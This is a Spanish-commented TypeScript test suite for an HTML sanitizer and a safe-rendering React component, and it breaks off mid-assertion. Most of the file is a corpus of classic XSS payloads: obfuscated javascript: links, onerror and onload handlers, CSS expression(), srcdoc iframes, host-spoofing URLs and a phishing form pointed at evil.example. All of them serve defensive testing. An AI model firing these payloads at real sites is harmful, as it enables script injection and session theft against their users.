// =============================================================================
// html-seguro — el saneo del texto rico con lista blanca, y lo que dibuja HtmlSeguro
// =============================================================================
// Ejecuta lib/html-seguro.ts (`sanearHtml`, `textoDeHtml`, `validarHtmlRico`, `hrefSeguro`,
// `srcSeguro`) y la mitad pura de app/_ui/HtmlSeguro.tsx (la referencia `mako-adjunto:<uuid>`, la
// alarma `pareceSaneado` y `traducirAdjuntos`).
//
// ⚠️ lib/html-seguro.ts abre con `import 'server-only'`, que TIRA fuera de la condición
//    `react-server`, y `npm test` corre sin ella. Así que el saneo se ejecuta en un HIJO con
//    `--conditions=react-server` (el molde de tests/lead-funnel-tablero.test.ts), UNA vez para todo
//    el corpus, y devuelve lo que contestó en JSON. Lo de HtmlSeguro.tsx se importa directo: no
//    lleva `server-only` ni 'use client'.
//
// Los ataques son los CLÁSICOS de XSS: un `href` con entidades, mayúsculas, tabs y espacios; un
// `svg onload`; un `img onerror`; un `style` con `expression()`; un `data:`; una referencia a un
// adjunto que no es un uuid. El saneo tiene DOS capas (nuestras funciones en el transform y la lista
// de esquemas de sanitize-html): por eso las funciones de la primera capa se prueban también solas.
//
// Probado ROMPIÉNDOLO (07/10/2026), una rotura por vez sobre el archivo real, restaurado desde la
// copia guardada en memoria (verificado por hash). Con todo en su lugar: 13 pass / 0 fail. Cada
// rotura y lo que tumbó:
//   · `hrefSeguro` acepta cualquier `mako-adjunto:` (sin `idDeRef`)  → 10 / 3 (ataques, la referencia, la primera capa)
//   · el color del span con `/.*/` en vez de la regex de colores    → 11 / 2 (ataques, el `style`)
//   · `svg` en `allowedTags`                                        → 12 / 1 (ataques)
//   · la imagen sin `src` deja de sacarse en `exclusiveFilter`      → 11 / 2 (ataques, la referencia)
//   · `srcSeguro` acepta cualquier https                            → 11 / 2 (ataques, la primera capa)
//   · el link sale sin forzar `rel`                                 → 12 / 1 (lo que sí pasa, exacto)
//   · `traducirAdjuntos` sin `urlDibujable`                         → 12 / 1 (la traducción)
//   · `pareceSaneado` sin vaciar los valores antes de buscar `on…=` → 12 / 1 (la alarma)
//   · la sangría de la lista anidada en `textoDeHtml`               → 12 / 1 (el texto plano)
//   · `hrefSeguro` vuelto LISTA NEGRA (sólo rechaza `javascript:`)  → 12 / 1 (SOLO «la primera capa, sola»)
// ⚠️ La última es la que muestra por qué hay dos capas Y por qué se prueban por separado: con la
//    primera aflojada, el corpus de ataques sigue en verde porque la segunda (los esquemas de
//    sanitize-html) frena el `data:` y el `vbscript:`. Sin el test de la primera capa sola, ese
//    aflojamiento no lo vería nadie hasta que alguien afloje también la segunda.
//
// REVISIÓN ADVERSARIAL (08/10/2026): tres defectos que este archivo daba en VERDE, arreglados, y su
// rotura con el mismo método (restaurado de memoria, hash verificado). Con todo en su lugar: 14 / 0.
//   · `srcSeguro` aceptaba CUALQUIER ruta de hola-mako.com: `<img src=".../api/compartido/curso/
//     entrar?t=…">` salía tal cual, un GET con la sesión de cada uno que abre la clase. Ahora sólo
//     un archivo de imagen estático (`RUTA_IMAGEN_PROPIA`). Volver a la regla de antes → 12 / 2
//     (los ataques y la primera capa).
//   · `traducirAdjuntos` reemplazaba con una CADENA: «$&» en la URL metía el atributo viejo adentro
//     del nuevo. Volver a la cadena → 13 / 1 (la traducción).
//   · Nada probaba que el COMPONENTE llamara a la alarma y a la traducción: las funciones podían
//     estar perfectas y `<HtmlSeguro>` no usarlas. Sacarle la alarma → 13 / 1; sacarle la traducción
//     → 13 / 1 (los dos, «el COMPONENTE…»).
//
// EL TAMAÑO DE UNA IMAGEN Y LAS TABLAS (08/10/2026, item 10 del pedido de Martín), con el mismo
// método. Con todo en su lugar: 18 / 0.
//   · `anchoDeImagen` acepta cualquier número                → 15 / 3 (idempotente, ataques de imagen y tabla, la primera capa sola)
//   · `anchoDeImagen` sin exigir el texto exacto («050»)     → 16 / 2 (ataques de imagen y tabla, la primera capa sola)
//   · las DOS capas del ancho flojas                          → 16 / 2 (los mismos)
//   · sólo la segunda capa (los `values`) floja               → 18 / 0 — la primera la cubre, como con los href.
//     ⚠️ Y al revés no es simétrico: sanitize-html, ante un valor fuera de `values`, NO saca el
//     atributo: lo deja VACÍO (`colspan=""`). Inofensivo, pero el HTML deja de ser el exacto; por
//     eso la primera capa (el transform) es la que lo saca entero.
//   · `colspan`/`rowspan` crudos en el transform              → 15 / 3 (lo que escribe el editor, idempotente, ataques)
//   · crudos y sin `values`                                   → 16 / 2 (lo que escribe el editor, ataques)
//   · `style` libre en una celda                              → 15 / 3 (ningún ataque…, lo que escribe el editor, ataques)
//   · sin las etiquetas de tabla en la lista                  → 15 / 3 (lo que escribe el editor, el texto plano, ataques)
//   · `textoDeHtml` sin separar las celdas                    → 17 / 1 (el texto plano)
//   · el COMPONENTE sin `envolverTablas`                      → 17 / 1 (la caja que scrollea)
//   · una regla de la lectura con su propia letra             → 17 / 1 (la hoja de lectura: item 3)
//   · `.mk-rico` sin `var(--ugc-fuente, inherit)`             → 17 / 1 (la hoja de lectura)
//   · sin la regla del centrado                               → 17 / 1 (la hoja de lectura)
//
// LO INSERTADO (08/10/2026, item 15: «que lo pueda embeber cosas como… el Calendar»), con el mismo método
// (scratchpad video/romper.mjs), corriendo juntos este archivo, tests/embeds.test.ts y
// tests/curso-video-embed.test.ts: 38 tests, 38 / 0 con todo en su lugar.
//   · sin `textFilter` (lo de adentro de un iframe pasa)                → 36 / 2 (lo que escribe el editor, idempotente)
//   · la 1ª capa floja: el transform copia los atributos del pedido     → 35 / 3 (ataques: `calendly.com:8443` pasa la 2ª capa,
//     que no mira el puerto; lo que escribe el editor; lo insertado)
//   · la 2ª capa floja (sin `allowedIframeHostnames`/`Domains`)         → 38 / 0 — la 1ª la cubre, como con los href
//   · las dos flojas                                                    → 33 / 5
//   · sólo un iframe cuenta como «vacío» (`sinContenido`)              → 36 / 2
//   · el texto plano sin la dirección de lo insertado                   → 37 / 1 (lo insertado)
//   · la alarma sin mirar cada iframe (`iframeCanonico`)               → 37 / 1 (la alarma acepta un iframe SÓLO…)
//   · la alarma vuelve a negar todo iframe                              → 37 / 1 (la misma: el componente no lo dibuja)
//   · la alarma acepta un atributo sin comillas dobles                  → 37 / 1 — 38 / 0 la primera vez: el caso de
//     comillas simples lo cazaba otra comparación. Se sumó `srcdoc=x` SIN comillas, que es el que importa: un
//     `srcdoc` corre con NUESTRO origen, y con `allow-same-origin` es un script en la app.
//   · la hoja de lectura sin el 16:9                                    → 37 / 1 (la hoja de lectura…)
//   · el host de Calendly con `endsWith`, sin mirar usuario/puerto, o
//     aceptando http (lib/embeds.ts)                                    → 35 / 3 cada una (y de este archivo: los ataques y lo insertado)

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { HtmlSeguro, idDeRef, refDeId, refsEnHtml, pareceSaneado, traducirAdjuntos, urlDibujable, anchoDeImagen, alineaDeImagen, ANCHOS_IMAGEN, envolverTablas, CSS_RICO, iframeCanonico } from '../app/_ui/HtmlSeguro';
import { ALTOS_EMBED } from '../lib/embeds';

const RAIZ = join(import.meta.dirname, '..');
const U = '0f8fad5b-d9cb-469f-a165-70867728950e';
const U2 = '9a3c2b1d-1111-4222-8333-444455556666';

// ── El corpus ────────────────────────────────────────────────────────────────

/** Ataques: NINGUNO puede salir con algo ejecutable. */
const ATAQUES: string[] = [
  '<a href="javascript:alert(1)">x</a>',
  '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href=" javascript:alert(1)">x</a>',
  '<a href="java&#09;script:alert(1)">x</a>',
  '<a href="java\tscript:alert(1)">x</a>',
  '<a href="java&#x0A;script:alert(1)">x</a>',
  '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>',
  '<a href="&#x6A;avascript:alert(1)">x</a>',
  '<a href="javascript&colon;alert(1)">x</a>',
  '<a href="&#0000106avascript:alert(1)">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<a href="//evil.example/x">x</a>',
  '<a href="https://banco.com@evil.example/">x</a>',
  '<a href="mailto:a@b.co?body=<script>">x</a>',
  '<svg onload=alert(1)><text>hola</text></svg>',
  '<svg><animate attributeName="href" to="javascript:alert(1)"/><a><text>x</text></a></svg>',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  '<img src=x onerror=alert(1)>',
  '<img src="x" onerror="alert(1)" />',
  '<IMG SRC="javascript:alert(1)">',
  '<img src="data:image/png;base64,iVBORw0KGgo=">',
  '<img src="https://evil.example/pixel.gif">',
  '<img src="http://hola-mako.com/a.png">',
  // Nuestro PROPIO origen, apuntado a una ruta que hace algo: un GET con las cookies de quien mira.
  '<img src="https://hola-mako.com/api/compartido/curso/entrar?t=abc">',
  '<img src="https://hola-mako.com/crm">',
  '<p onclick="alert(1)" style="background:url(javascript:alert(1))">p</p>',
  '<span style="color: expression(alert(1))">a</span>',
  '<span style="color: red; background-image: url(javascript:alert(1))">a</span>',
  '<span style="color: var(--x)">a</span>',
  '<div style="position:fixed;top:0;left:0;width:100%;height:100%">tapa</div>',
  '<iframe src="https://evil.example"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="javascript:alert(1)"></object><embed src="x.swf">',
  '<form action="https://evil.example"><input name="clave" type="password"><button>Entrar</button></form>',
  '<base href="https://evil.example/">',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<link rel="stylesheet" href="https://evil.example/x.css">',
  '<style>body{display:none}</style><p>texto</p>',
  '<script>alert(1)</script>',
  '<scr<script>ipt>alert(1)</script>',
  '<!--<img src=x onerror=alert(1)>-->',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  '<p><a href="mako-adjunto:no-es-un-uuid">x</a></p>',
  `<img src="mako-adjunto:${U.toUpperCase()}">`,
  `<img src="mako-adjunto:${U}x">`,
  `<img src="mako-adjunto:${U}" onerror="alert(1)">`,
  `<a href="mako-adjunto:${U}" onclick="alert(1)" class="mk-adjunto evil">P.pdf</a>`,
  '<a href="https://ok.example" target="_self" rel="opener">x</a>',
  '<ul data-type="javascript:alert(1)"><li data-type="taskItem" data-checked="javascript:x"><p>y</p></li></ul>',
  '<ol start="1;alert(1)"><li>a</li></ol>',
  '<template><img src=x onerror=alert(1)></template>',
  '<select><option><img src=x onerror=alert(1)></option></select>',
  '<textarea><img src=x onerror=alert(1)></textarea>',
  '<details open ontoggle=alert(1)><summary>x</summary></details>',
  '<a href="https://ok.example"><img src="x" onerror="alert(1)"></a>',
  // El tamaño de una imagen (08/10/2026, item 10): sólo uno de los diecinueve anchos, como TEXTO
  // exacto, y sólo «centro». Nunca un `style` en una imagen.
  `<img src="mako-adjunto:${U}" data-ancho="50;position:fixed">`,
  `<img src="mako-adjunto:${U}" data-ancho="expression(alert(1))">`,
  `<img src="mako-adjunto:${U}" data-ancho="050">`,
  `<img src="mako-adjunto:${U}" data-ancho="500" data-alinea="javascript:alert(1)">`,
  `<img src="mako-adjunto:${U}" data-ancho="33" style="width:50%;position:fixed;top:0" data-alinea="centro " onload="alert(1)">`,
  // Tablas (08/10/2026, item 10): de una tabla pegada pasan sólo `colspan`/`rowspan` (2 a 20) y la
  // alineación de la celda.
  '<table style="position:fixed;top:0" onmouseover="alert(1)" background="javascript:alert(1)" border="9"><tr><td colspan="2;x" rowspan="999" style="background:url(javascript:alert(1));text-align:right" onclick="alert(1)" scope="col" bgcolor="red">a</td></tr></table>',
  '<table><caption><img src=x onerror=alert(1)>c</caption><colgroup><col span="2" style="width:9999px"></colgroup><thead><tr><th colspan="0">a</th><th colspan="-1">b</th><th colspan="1e3">c</th><th colspan=" 2">d</th><th colspan="21">e</th><th rowspan="02">f</th></tr></thead></table>',
  '<table><tbody><tr><td><iframe src="https://evil.example"></iframe><svg onload=alert(1)></svg>x</td></tr></tbody></table>',
  '<table><tr><td style="text-align:center;width:9999px;position:fixed">z</td><th style="text-align: inherit">w</th></tr></table>',
  // Lo insertado (08/10/2026, item 15): un iframe que NO es de la lista no deja nada.
  '<iframe src="https://calendly.com.evil.tld/juan/30min"></iframe>',
  '<iframe src="https://evil.com.calendly.com/juan/30min"></iframe>',
  '<iframe src="https://calendly.com@evil.tld/juan/30min"></iframe>',
  '<iframe src="https://calendly.com:8443/juan/30min"></iframe>',
  '<iframe src="http://calendly.com/juan/30min"></iframe>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<iframe src="JaVaScRiPt:alert(1)"></iframe>',
  '<iframe src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
  '<iframe src="//calendly.com/juan/30min"></iframe>',
  '<iframe src="/api/compartido/curso/entrar?t=abc"></iframe>',
  '<iframe src="https://evil.tld/x" onload="alert(1)"></iframe>',
  '<iframe src="https://www.youtube.com/watch?v=abc/../x"></iframe>',
  '<iframe srcdoc="<img src=x onerror=alert(1)>" src="https://evil.tld/"></iframe>',
  '<iframe src="https://evil.tld/"><img src=x onerror=alert(1)></iframe>',
];

/** Un iframe de la lista tal cual lo escribe el saneo: el `src` rearmado y los atributos fijos. */
const IFRAME = (src: string, titulo: string, proveedor: string, alto?: number) =>
  `<iframe src="${src}" title="${titulo}" data-proveedor="${proveedor}"${alto ? ` data-alto="${alto}"` : ''} sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-popups-to-escape-sandbox allow-presentation allow-storage-access-by-user-activation" allow="autoplay; fullscreen; picture-in-picture; encrypted-media; clipboard-write" loading="lazy" referrerpolicy="strict-origin-when-cross-origin"></iframe>`;
const YT_SANEADO = IFRAME('https://www.youtube-nocookie.com/embed/dQw4w9WgXcQ?rel=0', 'YouTube', 'youtube');
const CAL_SANEADO = (alto = 700) => IFRAME('https://calendly.com/juan/30min', 'Calendly', 'calendly', alto);

/** Lo que SÍ pasa, y cómo sale (exacto): lo que escribe el editor y lo que se pega de Word o Docs. */
const PASAN: Array<[string, string]> = [
  ['<p>Hola <strong>mundo</strong> <em>y</em> <u>más</u> <s>no</s> <code>x</code></p>', '<p>Hola <strong>mundo</strong> <em>y</em> <u>más</u> <s>no</s> <code>x</code></p>'],
  ['<h1>T</h1><h2>D</h2><h3>S</h3><h4>C</h4>', '<h2>T</h2><h2>D</h2><h3>S</h3><h3>C</h3>'],
  ['<p style="text-align: center; position: fixed">c</p>', '<p style="text-align:center">c</p>'],
  ['<p style="text-align: inherit">c</p>', '<p>c</p>'],
  ['<p><span style="color: #DC2626; font-size: 40px">r</span><span style="background-color: rgb(1, 2, 3)">f</span></p>', '<p><span style="color:#DC2626">r</span><span style="background-color:rgb(1, 2, 3)">f</span></p>'],
  ['<p><mark data-color="#FEF08A" style="background-color: #FEF08A; color: inherit">res</mark></p>', '<p><mark style="background-color:#FEF08A">res</mark></p>'],
  ['<p><a href="https://ej.com/a?b=1&c=2" target="_blank">ir</a></p>', '<p><a href="https://ej.com/a?b=1&amp;c=2" target="_blank" rel="noopener noreferrer nofollow">ir</a></p>'],
  ['<p><a href="mailto:hola@ej.com">escribir</a></p>', '<p><a href="mailto:hola@ej.com" target="_blank" rel="noopener noreferrer nofollow">escribir</a></p>'],
  [`<img src="mako-adjunto:${U}" alt="Plano" width="640" height="abc">`, `<img src="mako-adjunto:${U}" alt="Plano" width="640" />`],
  ['<img src="https://hola-mako.com/cono-ugc/a.webp" alt="">', '<img src="https://hola-mako.com/cono-ugc/a.webp" alt="" />'],
  [`<p>Ver <a class="mk-adjunto" href="mako-adjunto:${U2}">Precios.pdf</a></p>`, `<p>Ver <a href="mako-adjunto:${U2}" class="mk-adjunto" target="_blank" rel="noopener noreferrer nofollow">Precios.pdf</a></p>`],
  ['<ul><li><p>a</p></li></ul><ol start="3"><li><p>b</p></li></ol><blockquote><p>c</p></blockquote><hr><pre><code>d</code></pre><p>e<br>f</p>',
    '<ul><li><p>a</p></li></ul><ol start="3"><li><p>b</p></li></ol><blockquote><p>c</p></blockquote><hr /><pre><code>d</code></pre><p>e<br />f</p>'],
  // La lista de tareas tal cual la escribe TipTap: la casilla (`label`/`input`) no se guarda, la
  // dibuja el CSS desde `data-checked`.
  ['<ul data-type="taskList"><li data-type="taskItem" data-checked="true"><label><input type="checkbox" checked="checked"><span></span></label><div><p>hecho</p></div></li><li data-type="taskItem" data-checked="false"><label><input type="checkbox"><span></span></label><div><p>falta</p></div></li></ul>',
    '<ul data-type="taskList"><li data-type="taskItem" data-checked="true"><p>hecho</p></li><li data-type="taskItem" data-checked="false"><p>falta</p></li></ul>'],
  // Google Docs envuelve TODO en un <b> «normal»: no es negrita.
  ['<b style="font-weight:normal;" id="docs-internal-guid-1"><p dir="ltr"><span style="font-weight:700">Negrita</span> normal</p></b>', '<p>Negrita normal</p>'],
  // Word: clases, estilos mso, comentarios condicionales y <o:p>.
  ['<!--[if gte mso 9]><xml><w:WordDocument></w:WordDocument></xml><![endif]--><p class="MsoNormal" style="mso-margin-top-alt:auto">Hola<o:p></o:p></p>', '<p>Hola</p>'],
  ['<p></p>', ''],
  ['<p><br></p><p>   </p>', ''],
  // El tamaño de una imagen, como lo escribe el editor (08/10/2026).
  [`<img src="mako-adjunto:${U}" alt="a" data-ancho="50" data-alinea="centro"><img src="mako-adjunto:${U2}" alt="b" data-ancho="10"><img src="mako-adjunto:${U2}" alt="c" data-ancho="100">`,
    `<img src="mako-adjunto:${U}" alt="a" data-ancho="50" data-alinea="centro" /><img src="mako-adjunto:${U2}" alt="b" data-ancho="10" /><img src="mako-adjunto:${U2}" alt="c" data-ancho="100" />`],
  // Una tabla como la escribe TipTap: el `style` de la tabla y el `colgroup` (anchos en px) no se
  // guardan, el `colspan` de 1 tampoco (es el default), la alineación de la celda sí.
  ['<table style="min-width: 75px;"><colgroup><col style="min-width: 25px;"><col style="min-width: 25px;"></colgroup><tbody><tr><th><p>Plan</p></th><th colspan="2" rowspan="1"><p>Precio</p></th></tr><tr><td><p>Base</p></td><td style="text-align: center"><p>US$10</p></td></tr></tbody></table>',
    '<table><tbody><tr><th><p>Plan</p></th><th colspan="2"><p>Precio</p></th></tr><tr><td><p>Base</p></td><td style="text-align:center"><p>US$10</p></td></tr></tbody></table>'],
  // Pegada de Excel: clases, estilos y atributos de Office afuera; queda la tabla.
  ['<table border=0 cellpadding=0 cellspacing=0 width=300 style="border-collapse:collapse"><col width=100 span=3><tr height=20><td class=xl65 height=20 width=100 style="height:15pt;width:75pt">12</td><td class=xl66 align=right>34</td></tr></table>',
    '<table><tr><td>12</td><td>34</td></tr></table>'],
  // Lo insertado (08/10/2026, item 15). El código de YouTube TAL CUAL lo da «Compartir → Insertar»:
  // sale con el `src` rearmado (sin cookies, sin el `si=`) y los atributos fijos; los suyos no.
  ['<iframe width="560" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ?si=AbC" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>',
    YT_SANEADO],
  // Una agenda de la lista con TODO lo que no puede pasar: `srcdoc`, `onload`, un sandbox más flojo,
  // permisos de cámara, un `style`, un `name`. Sale el iframe de siempre, con el alto pedido (de la lista).
  ['<iframe src="https://calendly.com/juan/30min" srcdoc="<script>alert(1)</script>" onload="alert(1)" sandbox="allow-scripts allow-top-navigation" allow="camera; microphone" style="position:fixed;top:0" data-alto="900" name="x" referrerpolicy="unsafe-url"></iframe>',
    CAL_SANEADO(900)],
  // Lo de ADENTRO de un iframe no es texto de nadie; un alto fuera de la lista va al de su proveedor.
  ['<iframe src="https://calendly.com/juan/30min" data-alto="333"><img src=x onerror=alert(1)>texto escondido</iframe>', CAL_SANEADO(700)],
  // Como lo escribe el editor (el nodo «insertado»): igual, letra por letra.
  [`<p>Agenda aquí:</p>${CAL_SANEADO(700)}<p>Después</p>`, `<p>Agenda aquí:</p>${CAL_SANEADO(700)}<p>Después</p>`],
  // Sólo lo insertado, sin texto: NO es una descripción vacía.
  [YT_SANEADO, YT_SANEADO],
];

type Salida = {
  sanear: string[];
  idem: boolean[];
  pasan: string[];
  texto: Record<string, string>;
  href: Record<string, string | null>;
  src: Record<string, string | null>;
  validar: Record<string, { ok: boolean; error?: string; html?: string; texto?: string }>;
  gigante: { largo: number; ok: boolean };
};

let cache: Salida | null = null;
function correr(): Salida {
  if (cache) return cache;
  const url = pathToFileURL(join(RAIZ, 'lib/html-seguro.ts')).href;
  const codigo = `
    import { readFileSync } from 'node:fs';
    const m = await import(${JSON.stringify(url)});
    const d = JSON.parse(readFileSync(0, 'utf8'));
    const sanear = d.ataques.map((h) => m.sanearHtml(h));
    const idem = [...d.ataques, ...d.pasan].map((h) => { const a = m.sanearHtml(h); return m.sanearHtml(a) === a; });
    const pasan = d.pasan.map((h) => m.sanearHtml(h));
    const texto = Object.fromEntries(Object.entries(d.texto).map(([k, h]) => [k, m.textoDeHtml(h)]));
    const href = Object.fromEntries(d.hrefs.map((h) => [h, m.hrefSeguro(h)]));
    const src = Object.fromEntries(d.srcs.map((h) => [h, m.srcSeguro(h)]));
    const validar = Object.fromEntries(Object.entries(d.validar).map(([k, h]) => [k, m.validarHtmlRico(h === '__LARGO__' ? '<p>' + 'a'.repeat(m.TOPE_HTML + 10) + '</p>' : h)]));
    const g = m.sanearHtml('<p>' + '<b>x</b>'.repeat(120000) + '<a href="javascript:alert(1)">');
    console.log(JSON.stringify({ sanear, idem, pasan, texto, href, src, validar, gigante: { largo: g.length, ok: !/javascript/i.test(g) } }));
  `;
  const datos = {
    ataques: ATAQUES,
    pasan: PASAN.map(([h]) => h),
    texto: {
      completo: `<h2>Título</h2><p>Hola &amp; chau</p><ul><li><p>uno</p></li><li><p>dos</p><ul><li><p>sub</p></li></ul></li></ul><ol start="3"><li><p>a</p></li><li><p>b</p></li></ol><ul data-type="taskList"><li data-type="taskItem" data-checked="true"><p>hecho</p></li><li data-type="taskItem" data-checked="false"><p>falta</p></li></ul><p>Fin<br>línea</p><p>Ver <a href="mako-adjunto:${U}">Precios.pdf</a></p><img src="mako-adjunto:${U2}" alt="foto"><hr><blockquote><p>cita</p></blockquote>`,
      ataque: '<p>a<script>alert(1)</script>b</p>',
      vacio: '<p></p>',
      tabla: '<p>Antes</p><table><tbody><tr><th><p>Plan</p></th><th><p>Precio</p></th></tr><tr><td><p>Base</p><p>y más</p></td><td><p>US$10<br>al mes</p></td></tr></tbody></table><p>Después</p>',
      insertado: `<p>Agenda tu llamada:</p>${CAL_SANEADO(700)}<p>Después</p>`,
      soloInsertado: CAL_SANEADO(700),
    },
    hrefs: ['https://ej.com', 'http://ej.com/x y', 'mailto:hola@ej.com', `mako-adjunto:${U}`, `MAKO-ADJUNTO:${U}`, `mako-adjunto:${U}/x`,
      'javascript:alert(1)', ' JAVASCRIPT:alert(1)', 'java\tscript:alert(1)', 'data:text/html,x', '/relativa', '//evil.example', 'https://u:p@ej.com', 'ftp://ej.com', 'mailto:a b@c.d'],
    srcs: [`mako-adjunto:${U}`, 'https://hola-mako.com/a.png', 'https://evil.example/a.png', 'http://hola-mako.com/a.png', 'data:image/png;base64,AAAA', `mako-adjunto:${U.slice(0, -1)}`,
      'https://hola-mako.com/cono-ugc/curso/tapa.webp', 'https://hola-mako.com/api/compartido/curso/entrar?t=abc', 'https://hola-mako.com/api/x.png',
      'https://hola-mako.com/API/x.png', 'https://hola-mako.com/%61pi/x.png', 'https://hola-mako.com//api/x.png', 'https://hola-mako.com/_next/image?url=x',
      'https://hola-mako.com/a.png?v=1', 'https://hola-mako.com/a.png#x', 'https://hola-mako.com/crm', 'https://hola-mako.com/a.svg'],
    validar: { vacio: '', nulo: null, numero: 42, largo: '__LARGO__', bien: '<p>Hola <script>x</script><strong>che</strong></p>', agenda: '<iframe src="https://calendly.com/juan/30min"></iframe>' },
  };
  const out = execFileSync(process.execPath, ['--conditions=react-server', '--import', 'tsx', '--input-type=module', '-e', codigo], {
    cwd: RAIZ, encoding: 'utf8', timeout: 170_000, input: JSON.stringify(datos), stdio: ['pipe', 'pipe', 'pipe'],
  });
  const linea = out.trim().split('\n').filter((x) => x.startsWith('{')).pop();
  assert.ok(linea, `el hijo no devolvió JSON:\n${out}`);
  cache = JSON.parse(linea) as Salida;
  return cache;
}

/** Lo que NUNCA puede salir del saneo, mirado adentro de las etiquetas (el texto viene escapado). */
function peligros(html: string): string[] {
  const out: string[] = [];
  if (!pareceSaneado(html)) out.push('la alarma de HtmlSeguro');
  for (const m of html.matchAll(/<[a-z][^>]*>/gi)) {
    const t = m[0];
    if (/javascript:|vbscript:|data:|expression\(|url\(/i.test(t)) out.push(`esquema o css en ${t}`);
    if (/\sstyle="[^"]*(position|url|expression|var\()/i.test(t)) out.push(`style libre en ${t}`);
    if (/\shref="(?!https?:\/\/|mailto:|mako-adjunto:[0-9a-f-]{36}")/i.test(t)) out.push(`href raro en ${t}`);
    if (/\ssrc="(?!https:\/\/hola-mako\.com\/|mako-adjunto:[0-9a-f-]{36}")/i.test(t)) out.push(`src raro en ${t}`);
    if (/\sclass="(?!mk-adjunto")/.test(t)) out.push(`clase rara en ${t}`);
    if (/^<(svg|math|iframe|object|embed|form|input|button|base|meta|link|style|script|template|select|textarea|details|div|label)\b/i.test(t)) out.push(`etiqueta ${t}`);
  }
  if (/<!--/.test(html)) out.push('comentario');
  return out;
}

// ── Los ataques ──────────────────────────────────────────────────────────────

test('ningún ataque clásico sale con algo ejecutable', { timeout: 180_000 }, () => {
  const s = correr();
  const malos = ATAQUES.map((a, i) => ({ a, out: s.sanear[i], p: peligros(s.sanear[i]) })).filter((x) => x.p.length);
  assert.deepEqual(malos, [], 'el saneo dejó pasar algo');
  // Y los que tienen que quedar en NADA, quedan en nada (sin una etiqueta vacía de recuerdo).
  const idx = (h: string) => ATAQUES.indexOf(h);
  assert.equal(s.sanear[idx('<img src=x onerror=alert(1)>')], '');
  assert.equal(s.sanear[idx('<svg onload=alert(1)><text>hola</text></svg>')], '', 'el texto de un svg no es texto de nadie');
  assert.equal(s.sanear[idx('<script>alert(1)</script>')], '');
  assert.equal(s.sanear[idx('<iframe srcdoc="<script>alert(1)</script>"></iframe>')], '');
  assert.equal(s.sanear[idx('<img src="https://evil.example/pixel.gif">')], '', 'una imagen de afuera es un pixel que espía al alumno');
  assert.equal(s.sanear[idx('<img src="https://hola-mako.com/api/compartido/curso/entrar?t=abc">')], '',
    'una imagen de nuestro origen que apunta a una ruta es un GET con la sesión de cada uno que abre la clase');
  assert.equal(s.sanear[idx('<img src="https://hola-mako.com/crm">')], '', 'una página no es una imagen');
});

test('un href con entidades, mayúsculas, tabs o espacios es texto, no un link', { timeout: 180_000 }, () => {
  const s = correr();
  for (let i = 0; i < 12; i++) assert.equal(s.sanear[i], 'x', `«${ATAQUES[i]}» → «${s.sanear[i]}»`);
  assert.equal(s.sanear[ATAQUES.indexOf('<a href="https://banco.com@evil.example/">x</a>')], 'x', 'un usuario en la URL se lee como el banco y va al otro');
});

test('una referencia a un adjunto que no es EXACTAMENTE un uuid no pasa', { timeout: 180_000 }, () => {
  const s = correr();
  assert.equal(s.sanear[ATAQUES.indexOf('<p><a href="mako-adjunto:no-es-un-uuid">x</a></p>')], '<p>x</p>');
  assert.equal(s.sanear[ATAQUES.indexOf(`<img src="mako-adjunto:${U.toUpperCase()}">`)], '');
  assert.equal(s.sanear[ATAQUES.indexOf(`<img src="mako-adjunto:${U}x">`)], '');
  assert.equal(s.sanear[ATAQUES.indexOf(`<img src="mako-adjunto:${U}" onerror="alert(1)">`)], `<img src="mako-adjunto:${U}" alt="" />`);
  assert.equal(s.href[`mako-adjunto:${U}`], `mako-adjunto:${U}`);
  assert.equal(s.href[`MAKO-ADJUNTO:${U}`], null);
  assert.equal(s.href[`mako-adjunto:${U}/x`], null);
  assert.equal(s.src[`mako-adjunto:${U.slice(0, -1)}`], null);
});

test('el style: sólo color y fondo en un span, sólo alineación en un párrafo, con valores validados', { timeout: 180_000 }, () => {
  const s = correr();
  assert.equal(s.sanear[ATAQUES.indexOf('<span style="color: expression(alert(1))">a</span>')], 'a');
  assert.equal(s.sanear[ATAQUES.indexOf('<span style="color: red; background-image: url(javascript:alert(1))">a</span>')], 'a', 'un color con nombre no pasa, y una imagen de fondo tampoco');
  assert.equal(s.sanear[ATAQUES.indexOf('<span style="color: var(--x)">a</span>')], 'a');
  assert.equal(s.sanear[ATAQUES.indexOf('<div style="position:fixed;top:0;left:0;width:100%;height:100%">tapa</div>')], 'tapa');
  assert.equal(s.sanear[ATAQUES.indexOf('<p onclick="alert(1)" style="background:url(javascript:alert(1))">p</p>')], '<p>p</p>');
});

test('hrefSeguro y srcSeguro: la primera capa, sola', { timeout: 180_000 }, () => {
  const s = correr();
  assert.deepEqual(s.href, {
    'https://ej.com': 'https://ej.com/',
    'http://ej.com/x y': 'http://ej.com/x%20y',
    'mailto:hola@ej.com': 'mailto:hola@ej.com',
    [`mako-adjunto:${U}`]: `mako-adjunto:${U}`,
    [`MAKO-ADJUNTO:${U}`]: null,
    [`mako-adjunto:${U}/x`]: null,
    'javascript:alert(1)': null,
    ' JAVASCRIPT:alert(1)': null,
    'java\tscript:alert(1)': null,
    'data:text/html,x': null,
    '/relativa': null,
    '//evil.example': null,
    'https://u:p@ej.com': null,
    'ftp://ej.com': null,
    'mailto:a b@c.d': null,
  });
  assert.deepEqual(s.src, {
    [`mako-adjunto:${U}`]: `mako-adjunto:${U}`,
    'https://hola-mako.com/a.png': 'https://hola-mako.com/a.png',
